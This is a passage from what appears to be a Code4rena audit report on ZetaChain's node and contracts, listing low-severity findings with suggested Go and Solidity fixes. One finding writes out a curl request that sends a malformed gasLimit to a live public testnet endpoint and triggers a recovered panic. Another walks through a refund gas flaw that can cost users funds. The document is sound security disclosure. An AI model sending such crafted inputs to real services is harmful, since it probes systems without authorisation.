https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L210<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L237<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L286

## [07] `evm_signer::SignCancelTx` is unused code

`evm_signer::SignCancelTx` is unused code, would suggest to remove the function.

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L209-L228

## [08] gRPC endpoint `ConvertGasToZeta` is `unsafe`

gRPC endpoint `ConvertGasToZeta` is `unsafe` which allow to `panic this endpoint` very easely by providing a gas price that can't be converted in Integer. Fortunatelly, there is a `recovery`, so the program doesn't crash, which is why this is only submitted as a `Low`, otherwise that would be probably a High as you could DoS `zetacored` at will. 

This is confirmed throught directly reaching the public endpoint as follows:

```
REQUEST
curl -X 'GET' -H 'accept: application/json' 'https://zetachain-athens.blockpi.network/lcd/v1/public/zeta-chain/crosschain/convertGasToZeta?chainId=97&gasLimit=100_000_'

RESPONSE
{"code":13,"details":[],"message":"cannot convert \"100_000_\" to big.Int"}
```

While a more normal error would be as follows (for unknow chain):

```
REQUEST
curl -X 'GET' -H 'accept: application/json' 'https://zetachain-athens.blockpi.network/lcd/v1/public/zeta-chain/crosschain/convertGasToZeta?chainId=1&gasLimit=100_000'

RESPONSE
{"code":2,"details":[],"message":"codespace observer code 1102: chain not supported"}
```

I also added this unit test, which also confirm the issue and the a panic is occuring internally but recovered, as the error message match the panic.

<details>

```
// zeta_conversion_rate_test.go
package keeper

import (
	"github.com/stretchr/testify/require"
	"github.com/zeta-chain/zetacore/x/crosschain/types"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestConvertGasToZeta(t *testing.T) {
	keeper, ctx := setupKeeper(t)
	chainID := int64(1)
	gasLimitTest := "100_000_"
	keeper.SetGasPrice(ctx, types.GasPrice{
		ChainId:     chainID,
		MedianIndex: 0,
		Prices:      []uint64{2},
	})

	req := &types.QueryConvertGasToZetaRequest{chainID, gasLimitTest}

	fc, err := keeper.ConvertGasToZeta(ctx, req)
	require.Nil(t, err)
	assert.Nil(t, fc)
}
```

```
=== RUN   TestConvertGasToZeta
--- FAIL: TestConvertGasToZeta (0.02s)
panic: cannot convert "100_000_" to big.Int [recovered]
	panic: cannot convert "100_000_" to big.Int

goroutine 78 [running]:
testing.tRunner.func1.2({0x1601920, 0xc000c61d40})
	/usr/local/go/src/testing/testing.go:1526 +0x24e
testing.tRunner.func1()
	/usr/local/go/src/testing/testing.go:1529 +0x39f
panic({0x1601920, 0xc000c61d40})
	/usr/local/go/src/runtime/panic.go:884 +0x213
cosmossdk.io/math.NewUintFromString(...)
	/mnt/c/IX/GitProjects/go/pkg/mod/cosmossdk.io/math@v1.0.0-rc.0/uint.go:46
github.com/zeta-chain/zetacore/x/crosschain/keeper.Keeper.ConvertGasToZeta({{0x1cb6db8, 0xc000c61d10}, {0x1c985b0, 0xc000c61c10}, {0x1c985d8, 0xc000c61c20}, {0x1c99e38, 0xc000be0bb0}, {{0x1cb2a20, 0xc000c61d00}, ...}, ...}, ...)
	/mnt/c/IX/GitProjects/platform-tools/ETH_course/C4/2023-11-zetachain/repos/node/x/crosschain/keeper/zeta_conversion_rate.go:27 +0x85b
github.com/zeta-chain/zetacore/x/crosschain/keeper.TestConvertGasToZeta(0xc000ef8340?)
	/mnt/c/IX/GitProjects/platform-tools/ETH_course/C4/2023-11-zetachain/repos/node/x/crosschain/keeper/zeta_conversion_rate_test.go:23 +0x2ca
testing.tRunner(0xc000ef8340, 0x1af4e20)
	/usr/local/go/src/testing/testing.go:1576 +0x10b
created by testing.(*T).Run
	/usr/local/go/src/testing/testing.go:1629 +0x3ea
```

</details>

Even if this error is recovered, I would recommend the team to introduce a validation `ConvertGasToZeta` function such that the program return proper error, and not a panicked error, which doesn't give proper information about the error.

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/zeta_conversion_rate.go#L27

## [09] `updateTssAndConnectorAddresses` from `ZetaNonEth.sol` is allowing TSS and Updater adresses to be updated to the same address

`updateTssAndConnectorAddresses` from `ZetaNonEth.sol` is allowing TSS and Updater adresses to be updated to the **same address**, which defeat the purpose of `renounceTssAddressUpdater`. I would recommend to add the followind condition to protect against this.

```diff
    function updateTssAndConnectorAddresses(address tssAddress_, address connectorAddress_) external {
        if (msg.sender != tssAddressUpdater && msg.sender != tssAddress) revert CallerIsNotTssOrUpdater(msg.sender);
        if (tssAddress_ == address(0) || connectorAddress_ == address(0)) revert InvalidAddress();
+       if (tssAddress_ == connectorAddress_) revert InvalidAddress();

        tssAddress = tssAddress_;
        connectorAddress = connectorAddress_;

        emit TSSAddressUpdated(msg.sender, tssAddress_);
        emit ConnectorAddressUpdated(msg.sender, connectorAddress_);
    }
```

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/evm/Zeta.non-eth.sol#L40-L49

## [10] `EVMChainClient::observeInTX` is consuming events from EVM external chains. 

`EVMChainClient::observeInTX` is consuming events from EVM external chains. It will consume `ZetaSent` and `Deposited` logs plus check `Native asset` being sent directly to the TSS address. While Deposited and Native asset are communicated to Zetacore using `PostSendEVMGasLimit`, somehow `ZetaSent` isn't, which seems wrong, so I would recommended to update this.

```diff
      ...
		// Pull out arguments from logs
		for logs.Next() {
			msg, err := ob.GetInboundVoteMsgForZetaSentEvent(logs.Event)
			if err != nil {
				ob.logger.ExternalChainWatcher.Error().Err(err).Msg("error getting inbound vote msg")
				continue
			}

-	                zetaHash, err := ob.zetaClient.PostSend(PostSendNonEVMGasLimit, &msg)
+	                zetaHash, err := ob.zetaClient.PostSend(PostSendEVMGasLimit, &msg)
			if err != nil {
				ob.logger.ExternalChainWatcher.Error().Err(err).Msg("error posting to zeta core")
				return
			}
			ob.logger.ExternalChainWatcher.Info().Msgf("ZetaSent event detected and reported: PostSend zeta tx: %s", zetaHash)
		}

      ...
```

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_client.go#L856<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_client.go#L898<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_client.go#L977

## [11] `FetchZetaZetaNonEthTokenContract` naming seems wrong

`FetchZetaZetaNonEthTokenContract` naming seems wrong, would recommend to rename is `FetchZetaNonEthTokenContract`.

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_client.go#L261-L263

## [12] `ERC20Custody::whitelist` allow any address to be whitelisted

`ERC20Custody::whitelist` allow any address to be whitelisted, the only verification that is made (inside Observer before calling ERC20Custody contract) is that it's not address(0). But this open the room for operational mistake like whitelisting ZETA token itself. Doing so would cause potential problems, as now the user would be able to pass throught ERC20Custody to send ZETA, which is not expected, and could cause multiples sides effect.
- Supply [not properly calculated](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/zeta_supply_checker.go#L216-L218) in ZetaSupplyChecker.
- By-passing [security check](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/utils.go#L153-L156) that are present only when processing ZetaSent log, but not Deposited log.

I would recommend todo the following verification in the contract (or do it in the Observer)

```diff
    function whitelist(IERC20 asset) external onlyTSS {
+       if (address(asset) == address(zeta)) revert InvalidAsset();

        whitelisted[asset] = true;
        emit Whitelisted(asset);
    }
```

## [13] The following protection code in `fungible\keeper\evm_hooks.go` is totally redundant

The following protection code in `fungible\keeper\evm_hooks.go` is totally redundant as if you trace back where hooks are called (with `PostTxProcessing`) in **ethermint@v0.22.0::state_transition.go** you can see that `receipt` parameter even if passed as a pointer can `never be nil`. Otherwise in case you are paranoid and like redundant code and would like to keep it somehow, then add the same protection at least in `crosschain\keeper\evm_hooks.go` so that is consistent accross the protocol.

```diff
func (k Keeper) CheckPausedZRC20(ctx sdk.Context, receipt *ethtypes.Receipt) error {
-	if receipt == nil {
-		return nil
-	}

	// get non-duplicated list of all addresses that emitted logs
	var addresses []ethcommon.Address
```

**ETHERMINT**
```
	if !res.Failed() {
		receipt.Status = ethtypes.ReceiptStatusSuccessful
		// Only call hooks if tx executed successfully.
		if err = k.PostTxProcessing(tmpCtx, msg, receipt); err != nil {
			// If hooks return error, revert the whole tx.
			res.VmError = types.ErrPostTxProcessing.Error()
			k.Logger(ctx).Error("tx post processing failed", "error", err)
                        ...
```

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/fungible/keeper/evm_hooks.go#L31-L33

## [14] When `PostTxProcessing` I would recommend to use the same protection in `fungible` and `crosschain` when you iterage over logs

When `PostTxProcessing` I would recommend to use the same protection in `fungible` and `crosschain` when you iterage over logs. Right now crosschain is lacking the nil check (which might be redundant, I didn't check). Moreover, I would `highly recommend` to check the `Removed` field as indicated by the documention and ignore those. 

```
	// The Removed field is true if this log was reverted due to a chain reorganisation.
	// You must pay attention to this field if you receive logs through a filter query.
	Removed bool `json:"removed"`
```

```
        ...

	for _, log := range logs {
+		if log == nil || log.Removed {
+			continue
+		}

		eventWithdrawal, err := k.ParseZRC20WithdrawalEvent(ctx, *log)
		if err == nil {
			if err := k.ProcessZRC20WithdrawalEvent(ctx, eventWithdrawal, emittingContract, txOrigin); err != nil {
				return err
			}
		}
		eZeta, err := ParseZetaSentEvent(*log, connectorZEVMAddr)
		if err == nil {
			if err := k.ProcessZetaSentEvent(ctx, eZeta, emittingContract, txOrigin); err != nil {
				return err
			}
		}
	}

        ...
```

## [15] `ProcessZetaSentEvent` lacks any validation for the `DestinationAddress` 

`ProcessZetaSentEvent` lacks any validation for the `DestinationAddress` which could translate in funds loss if sent to invalid address or address(0). I would recommend to use the same logic as in `ProcessZRC20WithdrawalEvent` which is better implementated, which validate the destination address is not empty and valid.

<details>

```diff
func (k Keeper) ProcessZetaSentEvent(ctx sdk.Context, event *connectorzevm.ZetaConnectorZEVMZetaSent, emittingContract ethcommon.Address, txOrigin string) error {
	if !k.zetaObserverKeeper.IsInboundEnabled(ctx) {
		return types.ErrNotEnoughPermissions
	}

        ...

	if receiverChain.IsExternalChain() && coreParams.ZetaTokenContractAddress == "" {
		return types.ErrUnableToSendCoinType
	}
-	toAddr := "0x" + hex.EncodeToString(event.DestinationAddress)
+	toAddr, err := receiverChain.EncodeAddress(event.DestinationAddress)
+	if err != nil {
+		return fmt.Errorf("cannot encode address %s: %s", event.DestinationAddress, err.Error())
+	}
+
	senderChain := common.ZetaChain()
	amount := math.NewUintFromBigInt(event.ZetaValueAndGas)

        ...

```
</details>

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/evm_hooks.go#L209

## [16] `PayGasInZetaAndUpdateCctx`, `PayGasNativeAndUpdateCctx` and `PayGasInERC20AndUpdateCctx` should use `GTE` instead of `GT`.

I would recommend to following change to not be `sending 0 amount value` accross Zetachain protocol which can happen if the amount of value sent is exactly the same as fees, granted that should be rare, which is why this is a Low severity. `PayGasInZetaAndUpdateCctx`, `PayGasNativeAndUpdateCctx` and `PayGasInERC20AndUpdateCctx` should use `GTE` instead of `GT`.

```diff
	// subtract the withdraw fee from the input amount
-	if outTxGasFee.GT(inputAmount) {
+	if outTxGasFee.GTE(inputAmount) {
		return cosmoserrors.Wrap(types.ErrNotEnoughGas, fmt.Sprintf("outTxGasFee(%s) more than available gas for tx (%s) | Identifiers : %s ",
			outTxGasFee,
			inputAmount,
			cctx.LogIdentifierForCCTX()),
		)
	}
	ctx.Logger().Info("Subtracting amount from inbound tx", "amount", inputAmount.String(), "fee", outTxGasFee.String())
	newAmount := inputAmount.Sub(outTxGasFee)
```

```diff
	// reduce the amount of the outbound tx
-	if feeInZeta.GT(zetaBurnt) {
+	if feeInZeta.GTE(zetaBurnt) {
		return cosmoserrors.Wrap(types.ErrNotEnoughZetaBurnt, fmt.Sprintf("feeInZeta(%s) more than zetaBurnt (%s) | Identifiers : %s ",
			feeInZeta,
			zetaBurnt,
			cctx.LogIdentifierForCCTX()),
		)
	}
```

```diff
	// subtract the withdraw fee from the input amount
-	if math.NewUintFromBigInt(feeInZRC20).GT(inputAmount) {
+	if math.NewUintFromBigInt(feeInZRC20).GTE(inputAmount) {
		return cosmoserrors.Wrap(types.ErrNotEnoughGas, fmt.Sprintf("feeInZRC20(%s) more than available gas for tx (%s) | Identifiers : %s ",
			feeInZRC20,
			inputAmount,
			cctx.LogIdentifierForCCTX()),
		)
	}
	newAmount := inputAmount.Sub(math.NewUintFromBigInt(feeInZRC20))
```

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/gas_payment.go#L109<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/gas_payment.go#L171<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/gas_payment.go#L299

## [17] Verify the receiver chain is supported in `ProcessZRC20WithdrawalEvent`
I would recommend to verify the receiver chain is supported in `ProcessZRC20WithdrawalEvent`. I understand that the condition is mostly redundant in the moment as that would require `foreignCoin.ForeignChainId` to be invalid somehow (which seem impossible by [updating](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/msg_server_update_core_params.go#L22-L24)), but just to be safe, it would be more explicit and safer when refactoring the code.

<details>

```diff
func (k Keeper) ProcessZRC20WithdrawalEvent(ctx sdk.Context, event *zrc20.ZRC20Withdrawal, emittingContract ethcommon.Address, txOrigin string) error {
	if !k.zetaObserverKeeper.IsInboundEnabled(ctx) {
		return types.ErrNotEnoughPermissions
	}
	ctx.Logger().Info("ZRC20 withdrawal to %s amount %d\n", hex.EncodeToString(event.To), event.Value)
	tss, found := k.GetTSS(ctx)
	if !found {
		return errorsmod.Wrap(types.ErrCannotFindTSSKeys, "ProcessZRC20WithdrawalEvent: cannot be processed without TSS keys")
	}
	foreignCoin, found := k.fungibleKeeper.GetForeignCoins(ctx, event.Raw.Address.Hex())
	if !found {
		return fmt.Errorf("cannot find foreign coin with emittingContract address %s", event.Raw.Address.Hex())
	}

	receiverChain := k.zetaObserverKeeper.GetParams(ctx).GetChainFromChainID(foreignCoin.ForeignChainId)
+	if receiverChain == nil {
+		return zetaObserverTypes.ErrSupportedChains
+	}
	senderChain := common.ZetaChain()
	toAddr, err := receiverChain.EncodeAddress(event.To)
```
</details>

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/evm_hooks.go#L126
 
## [18] `DisableInboundOnly` should probably be aligned with `IsOutboundEnabled`
There seems to be a divergence in the implementation regarding `DisableInboundOnly` and `IsOutboundEnabled`, which seems to indicate this is a bug.

[DisableInboundOnly](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/crosschain_flags.go#L54): in case crosschain flag is not found in the store, we fallback setting `IsOutboundEnabled` to true, which is permissive.
[IsOutboundEnabled](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/crosschain_flags.go#L40): in case crosschain flag is not found in the store, we fallback returning false, which is restrictive.

The proper behavior seems to be with `IsOutboundEnabled`, so `DisableInboundOnly` should probably be aligned.

```diff
func (k Keeper) DisableInboundOnly(ctx sdk.Context) {
-	flags, found := k.GetCrosschainFlags(ctx)
+	flags, _ := k.GetCrosschainFlags(ctx)
-	if !found {
-		flags.IsOutboundEnabled = true
-	}
	flags.IsInboundEnabled = false
	k.SetCrosschainFlags(ctx, flags)
}

func (k Keeper) IsOutboundEnabled(ctx sdk.Context) (found bool) {
	flags, found := k.GetCrosschainFlags(ctx)
	if !found {
		return false
	}
	return flags.IsOutboundEnabled
}
```

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/crosschain_flags.go#L40<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/crosschain_flags.go#L54

## [19] `CleanAddressList`, `UpdateObserverList` and `GetAllObserverMappersForAddress` should add a `break` in their loop.

`CleanAddressList`, `UpdateObserverList` and `GetAllObserverMappersForAddress` should add a `break` in their loop.

```diff
func CleanAddressList(addresslist []string, address string) []string {
	index := -1
	for i, addr := range addresslist {
		if addr == address {
			index = i
+                       break
		}
	}
	if index != -1 {
		addresslist = RemoveIndex(addresslist, index)
	}
	return addresslist
}
```

```diff
func UpdateObserverList(list []string, oldObserverAddresss, newObserverAddress string) {
	for i, observer := range list {
		if observer == oldObserverAddresss {
			list[i] = newObserverAddress
+                       break
		}
	}
}
```

```diff
func (k Keeper) GetAllObserverMappersForAddress(ctx sdk.Context, address string) (mappers []*types.ObserverMapper) {
	store := prefix.NewStore(ctx.KVStore(k.storeKey), types.KeyPrefix(types.ObserverMapperKey))
	iterator := sdk.KVStorePrefixIterator(store, []byte{})
	defer iterator.Close()
	for ; iterator.Valid(); iterator.Next() {
		var val types.ObserverMapper
		k.cdc.MustUnmarshal(iterator.Value(), &val)
		addToList := false
		for _, addr := range val.ObserverList {
			if addr == address {
				addToList = true
+                               break
			}
		}
		if addToList {
			mappers = append(mappers, &val)
		}
	}
	return
}
```

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/hooks.go#L138-L149<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/msg_server_update_observer.go#L94-L100<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/observer_mapper.go#L66-L84

## [20] `GetInboundVoteMsgForZetaSentEvent` should use the variable instead of doing the computation twice.

`GetInboundVoteMsgForZetaSentEvent` should use the variable instead of doing the computation twice.

<details>

```diff
func (ob *EVMChainClient) GetInboundVoteMsgForZetaSentEvent(event *zetaconnector.ZetaConnectorNonEthZetaSent) (types.MsgVoteOnObservedInboundTx, error) {
	ob.logger.ExternalChainWatcher.Info().Msgf("TxBlockNumber %d Transaction Hash: %s Message : %s", event.Raw.BlockNumber, event.Raw.TxHash, event.Message)
	destChain := common.GetChainFromChainID(event.DestinationChainId.Int64())
	if destChain == nil {
		ob.logger.ExternalChainWatcher.Warn().Msgf("chain id not supported  %d", event.DestinationChainId.Int64())
		return types.MsgVoteOnObservedInboundTx{}, fmt.Errorf("chain id not supported  %d", event.DestinationChainId.Int64())
	}
	destAddr := clienttypes.BytesToEthHex(event.DestinationAddress)
	if *destChain != common.ZetaChain() {
		cfgDest, found := ob.cfg.GetEVMConfig(destChain.ChainId)
		if !found {
			return types.MsgVoteOnObservedInboundTx{}, fmt.Errorf("chain id not present in EVMChainConfigs  %d", event.DestinationChainId.Int64())
		}
		if strings.EqualFold(destAddr, cfgDest.ZetaTokenContractAddress) {
			ob.logger.ExternalChainWatcher.Warn().Msgf("potential attack attempt: %s destination address is ZETA token contract address %s", destChain, destAddr)
			return types.MsgVoteOnObservedInboundTx{}, fmt.Errorf("potential attack attempt: %s destination address is ZETA token contract address %s", destChain, destAddr)
		}
	}
	return *GetInBoundVoteMessage(
		event.ZetaTxSenderAddress.Hex(),
		ob.chain.ChainId,
		event.SourceTxOriginAddress.Hex(),
-		clienttypes.BytesToEthHex(event.DestinationAddress),
+               destAddr,
		destChain.ChainId,
		sdkmath.NewUintFromBigInt(event.ZetaValueAndGas),
		base64.StdEncoding.EncodeToString(event.Message),
		event.Raw.TxHash.Hex(),
		event.Raw.BlockNumber,
		event.DestinationGasLimit.Uint64(),
		common.CoinType_Zeta,
		"",
		ob.zetaClient.GetKeys().GetOperatorAddress().String(),
		event.Raw.Index,
	), nil
}
```

</details>

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/utils.go#L162

## [21] There is a `missing nil` check in `AddBlockHeader` handler

There is a `missing nil` check in `AddBlockHeader` handler which will cause the `zetacored` to panic, but seems to recover or at least I was not able to generate a crash, which is why I submit this only as `Low`.

While Observers that broadcast those AddBlockHeader message are being [verified](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/types/messages_add_block_header.go#L55), such that an unknown chain is not possible, there is always the risk of a `malicious Observer` (or `malicious user` that have access to the node machine which could use the CLI to broadcast) to broadcast a `malicious AddBlockHeader message` which would include an `unknown chain` and trigger this panic.

I would recommend to add the missing nil check.

```diff
// AddBlockHeader handles adding a block header to the store, through majority voting of observers
func (k msgServer) AddBlockHeader(goCtx context.Context, msg *types.MsgAddBlockHeader) (*types.MsgAddBlockHeaderResponse, error) {
	ctx := sdk.UnwrapSDKContext(goCtx)

	// check authorization for this chain
	chain := common.GetChainFromChainID(msg.ChainId)
+	if chain == nil {
+		return nil, types.ErrSupportedChains
+	}	
	if ok := k.IsAuthorized(ctx, msg.Creator, chain); !ok {
		return nil, types.ErrNotAuthorizedPolicy
	}
```
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/msg_server_add_block_header.go#L18-L21

## [22] `MsgCreateTSSVoter::ValidateBasic` is lacking validations

`MsgCreateTSSVoter::ValidateBasic` is lacking validations, for example `TssPubkey` and `KeyGenZetaHeight` are not validated at all, and neither [inside the handler itself](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/msg_tss_voter.go#L29). While I understand this message is restricted to validator, I think you should add more validations as follow.

I would also recommend to go over all the `ValidateBasic` functions, the implementation is not consistent overall, like not all the message fields are validated inside their corresponding `ValidateBasic`, some lacking more then others.

```diff
func (msg *MsgCreateTSSVoter) ValidateBasic() error {
	_, err := sdk.AccAddressFromBech32(msg.Creator)
	if err != nil {
		return sdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, "invalid creator address (%s)", err)
	}
+
+	_, err = cosmos.GetPubKeyFromBech32(cosmos.Bech32PubKeyTypeAccPub, msg.TssPubkey)
+	if err != nil {
+		return errorsmod.Wrapf(sdkerrors.ErrInvalidPubKey, "invalid tss pubkey (%s)", err)
+	}

	return nil
}
```

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/types/message_tss_voter.go#L43-L49

## [[23] Depositing wZETA from EVM chain to another external supported chain could cost much more then expected](https://github.com/code-423n4/2023-11-zetachain-findings/issues/293)
*Note: At the judge’s request [here](https://github.com/code-423n4/2023-11-zetachain-findings/issues/164#issuecomment-1906690237), this downgraded issue from the same warden has been included in this report for completeness.*

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/gas_payment.go#L289<br>
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L169-L172

Normal cost of an `ERC20 transfer` on Ethereum is around `65000 gas unit`. User on Ethereum (or any EVM supported chain) can send their wZETA to another EVM supported chain (thanks to CCTX), which from a user perspective should be similar in terms of cost of a normal ERC20.

Unfortunatelly, this is not the reality, in some case this could imply a `huge cost` or `fund loss` for the user which seems to warrant `High` severity.

### Impact
`High gas fees` or `fund loss` when deposting wZETA to an external chain during the refund flow (see PoC).

Here are two undesired scenario that can occur depending on the inputs:
- `High gas, but higher wZETA value`: If user send a super high gas limit like 1M gas unit (which is not abnormal) and wZETA transfered was higher in value, the refund transaction will work but that will cost a LOT of money to the user. Considering a 200 wZeta transfer that revert so refunded on Ethereum, at 30 gwei gas price, ETH at 2355 USD and wZETA at 1 USD, (1M gas unit * 60 gwei) sounds like `140 USD in fees` for a failed transfer of the 200 wZETA (value of 200 USD), that's 70% of the value being transfered paid in fees! Worst is that the transfer didn't work, and the user is refunded only 30% of the value sent in that case (see PoC).
- `High gas, but lower wZETA value`: That will cause to return error `ErrNotEnoughZetaBurnt` in `PayGasInZetaAndUpdateCctx` and will cause the [transaction to be aborded](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L208-L217), `so funds loss` as refund is aborted.

### Proof of Concept

Let's consider the CCTX flow described in the `whitepaper` as follow for `Cross-Chain Message Passing`.

Let say Alice want to send 200 wZETA from Ethereum to BSC using `ZetaConnector.eth::send`. 

- At `step 1-2`, this is where the user call `ZetaConnector.eth::send` which will emit `ZetaSent` log.
- At `step 3`, this is where Observer consume the ZetaSent log in `GetInboundVoteMsgForZetaSentEvent`, do some basics validation (but use the [event.DestinationGasLimit](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/utils.go#L168) as is) and report it to zetacore, which will do some validation when receiving this broadcast in `VoteOnObservedInboundTx`.
- At `step 4-5`, this is where the inbound is finalized and the [CCTX is created](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L122), status is changed to `CctxStatus_PendingOutbound` as this is going to BSC and processed by Observers in `TryProcessOutTx`. 
- At `step 9`, unfortunatelly a failure happened (onReceive reverted, that can easily happen as dApp callback is involved, which is out of the control of Zeta protocol), so the `refund mechanism` will be triggered. 

`This is where there is an issue in the code.` Let's examine more in details [VoteOnObservedOutboundTx](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L144-L207) when the ballot is finalized.

1. [line 157] code branch `BallotStatus_BallotFinalized_FailureObservation` is selected as there was a revert.
2. [line 161] then the `else` branch is taken as `msg.CoinType == common.CoinType_Zeta`
3. [line 163] then case `types.CctxStatus_PendingOutbound` is selected
4. [line 165] [GetRevertGasLimit](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/cctx_utils.go#L122) will return (0, nil) since `cctx.InboundTxParams.CoinType == common.CoinType_Zeta`.
5. [line 171] code path `gasLimit = cctx.OutboundTxParams[0].OutboundTxGasLimit` will be reach, **`which is the problem`**. This will actually be the value specified originally by the user in the first call to `ZetaConnector.eth::send` (reminder:   event.DestinationGasLimit). 

The understanding of a gaslimit is that you can put very high limit to be sure your transaction doesn't lack gas and revert in the middle, as you know the remaining gas will be refunded to you. The problem here is that this is not the case, as Zeta makes the user pay in advance for the gas the TSS will spend to send the refund transaction on the sender chain (Ethereum).

As we can see, `gasLimit` is assigned to the new OutboundTxParams `OutboundTxGasLimit: gasLimit` and then `PayGasAndUpdateCctx` is called.

```
				switch oldStatus {
				case types.CctxStatus_PendingOutbound:

					gasLimit, err := k.GetRevertGasLimit(ctx, cctx)
					if err != nil {
						return errors.New("can't get revert tx gas limit" + err.Error())
					}
					if gasLimit == 0 {
						// use same gas limit of outbound as a fallback -- should not happen
						gasLimit = cctx.OutboundTxParams[0].OutboundTxGasLimit
					}

					// create new OutboundTxParams for the revert
					revertTxParams := &types.OutboundTxParams{
						Receiver:           cctx.InboundTxParams.Sender,
						ReceiverChainId:    cctx.InboundTxParams.SenderChainId,
						Amount:             cctx.InboundTxParams.Amount,
						CoinType:           cctx.InboundTxParams.CoinType,
						OutboundTxGasLimit: gasLimit,
					}
					cctx.OutboundTxParams = append(cctx.OutboundTxParams, revertTxParams)

					err = k.PayGasAndUpdateCctx(
						tmpCtx,
						cctx.InboundTxParams.SenderChainId,
						&cctx,
						cctx.OutboundTxParams[0].Amount,
						false,
					)
```

`PayGasInZetaAndUpdateCctx` is then called as working with common.CoinType_Zeta, and the function will consume [ALL the gaslimit](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/gas_payment.go#L289).

```
	// get the gas price
	gasPrice, isFound := k.GetMedianGasPriceInUint(ctx, chainID)
	if !isFound {
		return cosmoserrors.Wrap(types.ErrUnableToGetGasPrice, fmt.Sprintf(" chain %d | Identifiers : %s ",
			chainID,
			cctx.LogIdentifierForCCTX()),
		)
	}
	gasPrice = gasPrice.MulUint64(2) // overpays gas price by 2x

	gasLimit := sdk.NewUint(cctx.GetCurrentOutTxParam().OutboundTxGasLimit)
	outTxGasFee := gasLimit.Mul(gasPrice)

	// get the gas fee in Zeta using system uniswapv2 pool wzeta/gasZRC20 and adding the protocol fee
	outTxGasFeeInZeta, err := k.fungibleKeeper.QueryUniswapV2RouterGetZetaAmountsIn(ctx, outTxGasFee.BigInt(), gasZRC20)
	if err != nil {
		return cosmoserrors.Wrap(err, "PayGasInZetaAndUpdateCctx: unable to QueryUniswapv2RouterGetAmountsIn")
	}
	feeInZeta := types.GetProtocolFee().Add(math.NewUintFromBigInt(outTxGasFeeInZeta))

	// reduce the amount of the outbound tx
	if feeInZeta.GT(zetaBurnt) {
		return cosmoserrors.Wrap(types.ErrNotEnoughZetaBurnt, fmt.Sprintf("feeInZeta(%s) more than zetaBurnt (%s) | Identifiers : %s ",
			feeInZeta,
			zetaBurnt,
			cctx.LogIdentifierForCCTX()),
		)
	}
```

### Cross-Chain Message Passing flow

1. An end user interacts with a Contract C1 on Chain A.
2. The interaction leaves an event or transaction memo, with user specified [chainID,
contractAddress, message]. (The message is arbitrarily encoded application
data in binary format).
3. ZetaChain observers (in zetaclient) pick up this event/memo and report to
zetacore, which verifies the inbound transaction.
4. zetacore modifies the CCTX (cross-chain tx) state variable with OutboundTxParams
which instructs the TSS signers (in zetaclient) to build, sign, and broadcast
external transaction.
5. The zetaclient TSS signers observe the OutboundTxParams in the CCTX, and
build outbound tx, enter into a TSS keysign ceremony to sign the transaction,
and then broadcast the signed transaction to the external blockchains. For
CCMP, the outbound transaction is mainly calling the user specified contract
with specified addresses and parameters.
6. The CCTX structure also tracks the stages/status of the cross-chain transaction.
7. Once the broadcasted transaction is included in one of the blocks (said to be
“mined” or “confirmed”), zetaclients will report such confirmation to zetacore,
which will update the CCTX status.
8. If the “confirmed” outbound transaction was successful, the CCTX status becomes OutboundMined, and the CCTX is considered in its terminal state and
will not be updated anymore. This CCTX processing is completed.
9. If the “confirmed” outbound transaction is failure (e.g. revert on Ethereum
chains), then the CCTX will updates it status to PendingRevert if possible, or
